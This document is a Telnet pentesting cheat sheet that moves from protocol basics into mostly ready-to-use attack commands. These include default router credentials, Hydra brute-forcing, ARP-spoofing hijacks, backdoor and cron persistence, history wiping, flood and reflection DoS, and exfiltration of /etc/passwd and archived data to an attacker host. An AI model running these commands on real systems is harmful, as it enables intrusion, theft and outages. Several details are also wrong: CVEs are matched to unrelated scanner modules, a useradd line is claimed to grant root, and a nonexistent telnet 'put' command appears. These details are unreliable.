# P23 Telnet

## Index

* \[\[Ports, Protocols, and Services]]

## Telnet

* **Port Number:** 23 (default)
* **Protocol:** TCP
* **Service Name:** Telnet
* **Defined in:** RFC 854

The Telnet Protocol, defined in RFC 854, is a standard TCP-based protocol used for remote command-line access to network devices. Telnet allows users to connect to remote systems over a network and execute commands as if they were directly connected to the machine. Despite its historical significance, Telnet has fallen out of favor due to its lack of security, particularly the absence of encryption, which makes it vulnerable to eavesdropping and other forms of attack.

### Overview of Features

* **TCP-based Communication:** Operates over TCP, ensuring reliable, connection-oriented communication.
* **Text-based Command Execution:** Provides a simple, text-based interface for interacting with remote systems, allowing command execution and system management.
* **Session Multiplexing:** Allows multiple users to connect and interact with a remote system simultaneously.
* **Option Negotiation:** Supports option negotiation between client and server to determine capabilities and preferences, such as echoing, terminal type, and others.
* **Platform Independence:** Telnet can be used across various platforms, making it versatile for managing a wide range of devices and operating systems.
* **Historical Significance:** Widely used in the early days of the internet for remote management of Unix systems, routers, and other networked devices.

### Typical Use Cases

* **Remote System Administration:** Historically used by system administrators to manage and configure remote servers, particularly Unix-based systems.
* **Device Configuration:** Commonly employed for configuring network devices such as routers, switches, and firewalls before more secure protocols like SSH became prevalent.
* **Testing and Debugging:** Telnet is often used to test connectivity to a specific port on a remote server, especially for services like HTTP, SMTP, and others.
* **Simple File Transfers:** In some cases, Telnet has been used to transfer files between systems using ASCII or binary mode.

### How Telnet Protocol Works

1. **Client Initiation:**
   * **Step 1:** The Telnet client sends a TCP SYN packet to the server’s IP address on port 23, initiating a connection.
   * **Step 2:** The Telnet server responds with a SYN-ACK packet, acknowledging the connection request.
   * **Step 3:** The client sends an ACK packet, completing the TCP three-way handshake and establishing a connection.
2. **Option Negotiation:**
   * **Step 4:** The client and server enter a phase of option negotiation where they agree on terminal settings, echo options, binary transmission mode, etc.
   * **Step 5:** Options are negotiated using specific Telnet control commands, such as DO, DON’T, WILL, and WON’T.
3. **Session Establishment:**
   * **Step 6:** Once the options are agreed upon, the client is presented with a login prompt from the server.
   * **Step 7:** The user inputs their credentials (username and password) which are sent to the server in plaintext.
4. **Command Execution:**
   * **Step 8:** After authentication, the user is provided with a command-line interface (CLI) to execute commands on the remote system.
   * **Step 9:** Commands entered by the user are sent to the server, executed, and the output is returned to the client in real-time.
5. **Session Termination:**
   * **Step 10:** The session can be terminated by the client sending an exit or logout command.
   * **Step 11:** The server acknowledges the termination, and the TCP connection is gracefully closed by exchanging FIN and ACK packets.

#### Diagram (Hypothetical Example)

* **Client:** `<attack_ip>` initiates a Telnet session to `<target_ip>`:23
* **Server:** `<target_ip>` responds and enters into option negotiation.
* **Client:** `<attack_ip>` authenticates and executes commands on `<target_ip>`.

## Additional Information

### Security Considerations

* **Lack of Encryption:** Telnet transmits data, including login credentials, in plaintext, making it highly susceptible to interception and eavesdropping by malicious actors.
* **Vulnerability to Man-in-the-Middle Attacks:** Without encryption, Telnet sessions can be easily hijacked or manipulated by attackers positioned between the client and server.
* **Deprecated Usage:** Due to its inherent security weaknesses, Telnet has largely been replaced by more secure protocols like SSH (Secure Shell), which provides encrypted communication.

### Alternatives

* **SSH (Secure Shell):** SSH is the modern replacement for Telnet, offering encrypted remote login, secure command execution, and secure file transfer capabilities.
* **RDP (Remote Desktop Protocol):** For graphical remote access, RDP is commonly used on Windows systems, providing a secure, encrypted connection.

### Advanced Usage

* **Automated Scripts:** Telnet can be used in automated scripts for managing legacy systems that do not support SSH.
* **Custom Telnet Clients:** Some environments may require custom Telnet clients that include specific features or integrate with other network management tools.

### Modes of Operation

* **Interactive Mode:** The default mode where the user interacts with the remote system via a command-line interface.
* **Batch Mode:** Some implementations allow for the execution of predefined command scripts, automating repetitive tasks.

### Configuration Files

1. **Telnet Server Configuration (Example for Unix/Linux Systems):**

* **File Location:** `/etc/xinetd.d/telnet` (if managed by xinetd) or `/etc/inetd.conf` (if managed by inetd)
*   **xinetd Configuration Example:**

    ```bash
    service telnet
    {
        flags           = REUSE
        socket_type     = stream
        wait            = no
        user            = root
        server          = /usr/sbin/in.telnetd
        log_on_failure  += USERID
    }
    ```
*   **inetd Configuration Example:**

    ```bash
    telnet  stream  tcp  nowait  root  /usr/sbin/tcpd  in.telnetd
    ```
* **Key Settings:**
  * `socket_type`: Defines the socket type, typically `stream` for TCP.
  * `wait`: Determines if the service waits for a process to finish before accepting new connections (`no` allows multiple connections).
  * `server`: Specifies the path to the Telnet daemon (`in.telnetd`).

### Potential Misconfigurations

1. **Telnet Enabled on a Public-Facing Interface:**
   * **Risk:** Exposing Telnet on a public interface can lead to unauthorized access, particularly if strong authentication is not enforced.
   * **Exploitation:** Attackers can use tools like Hydra or Medusa to perform brute-force attacks on Telnet to gain unauthorized access.
2. **Weak or No Authentication:**
   * **Risk:** Using weak passwords or not enforcing authentication can allow easy access to the Telnet service.
   * **Exploitation:** An attacker can easily guess or brute-force weak credentials to gain access to the system.
3. **No Logging or Monitoring:**
   * **Risk:** Without proper logging, unauthorized Telnet access may go unnoticed, allowing attackers to maintain persistence on the network.
   * **Exploitation:** Attackers can use Telnet to access and manipulate systems without detection if logging is disabled or improperly configured.
4. **Unrestricted Telnet Access:**
   * **Risk:** Allowing Telnet access from any IP address can increase the attack surface.
   * **Exploitation:** Attackers can scan for open Telnet ports and attempt unauthorized access from various locations.

### Default Credentials

* **Cisco Routers/Switches:**
  * Username: `cisco`
  * Password: `cisco`
* **D-Link Routers:**
  * Username: `admin`
  * Password: (blank)
* **Linksys Routers:**
  * Username: `admin`
  * Password: `admin`
* **HP Printers:**
  * Username: `admin`
  * Password: `0000`
* **Netgear Routers:**
  * Username: `admin`
  * Password: `password`

These are common defaults, but it's crucial to consult specific device documentation as defaults can vary based on firmware and model.

## Interaction and Tools

### Tools

#### \[\[Telnet]]

*   **Telnet Connect:** Establishes a Telnet connection to the specified IP.

    ```bash
    telnet <target_ip> 23
    ```
*   **Telnet Connect to Specific Port:** Opens a Telnet connection to a specific port on the target system.

    ```bash
    telnet <target_ip> <port_number>
    ```
*   **Telnet Connect Authentication:** Logs into the Telnet server with the provided username and password.

    ```bash
    <username>
    <password>
    ```
*   **Execute Commands:** Executes a command on the remote system.

    ```bash
    echo "command" | telnet <target_ip> <port>
    ```
*   **Scripted Telnet Commands:** Automates a sequence of commands sent over Telnet, useful for repetitive tasks.

    ```bash
    (echo "username"; sleep 1; echo "password"; sleep 1; echo "ls"; sleep 1; echo "exit") | telnet <target_ip>
    ```

    ```bash
    (echo open <target_ip>; sleep 2; echo user; sleep 1; echo pass) | telnet
    ```
*   **Terminate Session:** Terminates the Telnet session and closes the connection.

    ```bash
    exit

    logout
    ```
*   **Automated Login with Expect:** Automates the Telnet login process using `expect`, allowing for automated sessions and command execution.

    ```bash
    expect -c '
    spawn telnet <target_ip>
    expect "login:"
    send "admin\r"
    expect "Password:"
    send "password\r"
    interact'
    ```
*   **Testing a Web Server with Telnet:** Manually sends an HTTP GET request to a web server to test its response using Telnet.

    ```bash
    telnet <target_ip> 80
    GET / HTTP/1.1
    Host: <target_ip>
    ```
*   **Sending Raw Data:** Sends a raw HTTP request to a web server using Telnet, allowing for low-level testing and debugging.

    ```bash
    echo -e "GET / HTTP/1.1\r\nHost: <target_ip>\r\n\r\n" | telnet <target_ip> 80
    ```

#### \[\[PuTTY]]

### Exploitation Tools

#### \[\[Metasploit]]

#### \[\[Wireshark]]

*   **Wireshark Packet Capture:**

    ```bash
    wireshark -i <interface> -f "tcp port 23"
    ```

#### \[\[Nmap]]

*   **Basic Nmap Scan:** Scan target on specified port to verify if service is on.

    ```bash
    nmap <target_ip> -p 23
    ```

#### \[\[NetCat]]

*   **Netcat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 23
    ```
*   **Netcat UDP Connect:** Simple test to verify port service is running and responding.

    ```bash
    nc <target_ip> 23 -u
    ```
*   **Execute Commands:** Execute commands on target.

    ```bash
    echo "<command>" | nc <target_ip> 23
    ```
*   **Exfiltrate Data:** Exfiltrate data over specified port.

    ```bash
    nc <target_ip> 23 < secret_data.txt
    ```

#### \[\[SoCat Cheat Sheet]]

*   **Socat TCP Connect:** Simple test to verify port service is running and responding.

    ```bash
    socat - TCP:<target_ip>:23
    ```

#### \[\[HPing3 Cheat Sheet]]

*   **Send UDP Packet:** Send a single UDP packet to the service.

    ```bash
    hping3 -2 <target_ip> -p 23 -c 1
    ```

### Other Techniques

## Penetration Testing Techniques

### External Reconnaissance

#### Port Scanning

*   **Tool:** \[\[Nmap]]

    ```bash
    nmap <target_ip> -p 23
    ```
* **Description:** Identifies if the target service is running on the target by scanning target port.

#### Service Enumeration

*   **Tool:** \[\[NetCat]]

    ```bash
    nc <target_ip> 23
    ```
* **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

### Initial Access

#### Exploit Default Credentials

*   **Tool:** \[\[Telnet]]

    ```bash
    telnet <target_ip> 23
    ```
* **Description:** Login using common default credentials for Telnet, especially on network devices.

#### Session Hijacking

* **Tool:** \[\[ettercap]]
*   **Command:**

    ```bash
    ettercap -T -M arp:remote /<client_ip>/ /<target_ip>/
    ```
* **Description:** Performs an ARP spoofing attack to hijack an active Telnet session, allowing the attacker to inject commands and potentially disrupt the service.

### Persistence

#### Creating a Backdoor

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    (echo "echo 'backdoor' >> /etc/rc.local"; echo "exit") | telnet <target_ip>
    ```
* **Description:** Modifies startup scripts on the target to maintain persistent access via Telnet.

#### Create a New User Account

*   **Tool:** \[\[Telnet]]

    ```bash
    useradd <username> -p $(openssl passwd -1 'password')
    ```
* **Description:** Creates a new user with root privileges via Telnet, allowing persistent access.

#### Installing Persistent Scripts

*   **Tool:** \[\[Telnet]]

    ```bash
    echo "@reboot root /bin/bash /path/to/script.sh" >> /etc/crontab
    ```
* **Description:** Adds a script to cron that runs at startup, ensuring persistence on the target system.

#### Leaving an Unauthenticated Telnet Session

* **Tool:** Manual
* **Description:** Leave a Telnet session open, especially on systems where logging out doesn’t automatically close the session.

### Credential Harvesting

#### Packet Capture

*   **Tool:** \[\[Wireshark]]

    ```bash
    wireshark -i <interface> -f "tcp port 23"
    ```
* **Description:** Capture traffic and extract plaintext credentials.

#### Man-in-the-Middle (MITM) Attack

*   **Tool:** \[\[ettercap]], \[\[BetterCap Cheat Sheet]]

    ```bash
    ettercap -T -q -M arp:remote /<target_ip_1>/ /<target_ip_2>/
    ```
* **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

### Privilege Escalation

#### Escalation via Sudo Misconfiguration

*   **Tool:** Manual

    ```bash
    sudo su -
    ```
* **Description:** If a Telnet user has sudo privileges, misconfigurations can be exploited to escalate to root.

#### Exploiting Weak File Permissions

*   **Tool:** Manual

    ```bash
    ls -la /etc/sudoers
    ```
* **Description:** Identifies files with weak permissions that can be modified to grant elevated privileges.

### Internal Reconnaissance

#### Network Mapping via Telnet

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    (for i in {1..254}; do echo "telnet 192.168.1.$i 23"; done) | telnet <target_ip>
    ```
* **Description:** Attempts to map internal network hosts via Telnet connections.

### Lateral Movement, Pivoting, and Tunnelling

#### Telnet Bounce

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    telnet <target_ip> 23 | telnet <next_hop_ip> 23
    ```
* **Description:** Use Telnet to pivot from one compromised system to another within the network.

#### Port Forwarding via Telnet

*   **Tool:** \[\[NetCat]]

    ```bash
    nc -l -p 1234 -c "telnet <target_ip> 23"
    ```
* **Description:** Forward Telnet traffic through a compromised host to access internal services.

#### Telnet Tunnelling

*   **Tool:** \[\[SSH]]

    ```bash
    ssh -L 23:<target_ip>:23 <user>@<gateway_ip> telnet localhost 23
    ```
* **Description:** Forward Telnet traffic through a compromised host to access internal services.

### Defense Evasion

#### Clearing Command History

*   **Tool:** \[\[Telnet]], Linux Commands

    ```bash
    telnet <target_ip> 23
    history -c && history -w
    ```
* **Description:** Clears the command history to remove traces of malicious activity on the target system.

#### Telnet Session Obfuscation

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    telnet <target_ip> 23 | while true; do echo ""; sleep 60; done
    ```
* **Description:** Keeps a Telnet session alive with minimal activity to avoid detection.

### Data Exfiltration

#### Exfiltrating Data via Telnet

*   **Tool:** \[\[Telnet]], \[\[Custom Scripts]]

    ```bash
    telnet <attack_ip> 23 < /etc/passwd
    ```
* **Description:** Sends sensitive files or data over a Telnet connection to an attacker-controlled system.

#### Concealing Data in Telnet Sessions

*   **Tool:** \[\[Telnet]], \[\[Custom Scripts]]

    ```bash
    tar cz /important/data | telnet <attack_ip> 23
    ```
* **Description:** Compresses and sends data over Telnet to conceal exfiltration activity.

#### Covert Data Transfer via Telnet

*   **Tool:** \[\[Custom Scripts]]

    ```bash
    echo "cat /etc/passwd" | telnet <target_ip> 23 > exfil.txt
    ```
* **Description:** Exfiltrate sensitive data by executing commands via Telnet and capturing the output.

#### Telnet-based File Transfer

*   **Tool:** \[\[Telnet]]

    ```bash
    telnet <target_ip> 23
    telnet> binary
    telnet> put file.txt
    ```
* **Description:** Transfer files using Telnet’s binary mode, often used in legacy systems.

## Exploits and Attacks

### Password Attacks

#### Password Brute Force

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra telnet://<target_ip> -s 23 -l <username> -P <password_list>
    ```
* **Description:** Test a single username against multiple passwords.

#### Password Spray

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra telnet://<target_ip> -s 23 -l <username_list> -P <password>
    ```
* **Description:** Test a multiple usernames against a single password.

#### Offline Hash Cracking

*   **Tool:** \[\[John the Ripper Cheat Sheet]]

    ```bash
    john --wordlist=<path/to/wordlist> <hash_file>
    ```

\


*   **Tool:**

    ```bash
    hashcat -m <mode> <hash_file> <path/to/wordlist>
    ```

### Denial of Service

#### TCP/UPD Flood Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
* **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

#### TCP/UDP Reflection Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
* **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### Exploits

#### Telnetd Vulnerability (CVE-2011-4862)

*   **Tool:** Custom Exploit, \[\[Metasploit]]

    ```bash
    use exploit/unix/telnet/telnet_login
    set RHOSTS <target_ip>
    set USERNAME root
    set PASSWORD toor
    exploit
    ```
* **Description:** Exploits a known vulnerability in the Telnet daemon, allowing an attacker to bypass authentication and gain root access.

#### CVE-2001-0554

*   **Tool:** \[\[Metasploit]]

    ```bash
    use auxiliary/scanner/telnet/telnet_version
    set RHOSTS <target_ip>
    exploit
    ```
* **Description:** Exploits a known buffer overflow vulnerability in older Telnet services, potentially leading to remote code execution.

## Resources

| **Website**                             | **URL**                                                                    |
| --------------------------------------- | -------------------------------------------------------------------------- |
| RFC 854 - Telnet Protocol Specification | https://tools.ietf.org/html/rfc854                                         |
| Nmap Telnet Service Probes              | https://nmap.org/book/nmap-probes.html                                     |
| Netcat Guide                            | https://nmap.org/ncat/guide/index.html                                     |
| PuTTY Telnet Documentation              | https://www.putty.org/                                                     |
| Hydra Manual                            | https://tools.kali.org/password-attacks/hydra                              |
| Wireshark User Guide                    | https://www.wireshark.org/docs/wsug\_html\_chunked/                        |
| TCP/IP Illustrated                      | https://www.amazon.com/TCP-Illustrated-Volume-Implementation/dp/0201633469 |
| Metasploit Documentation                | https://www.metasploit.com/get-started/documentation                       |
| Linux man-pages                         | https://man7.org/linux/man-pages/                                          |
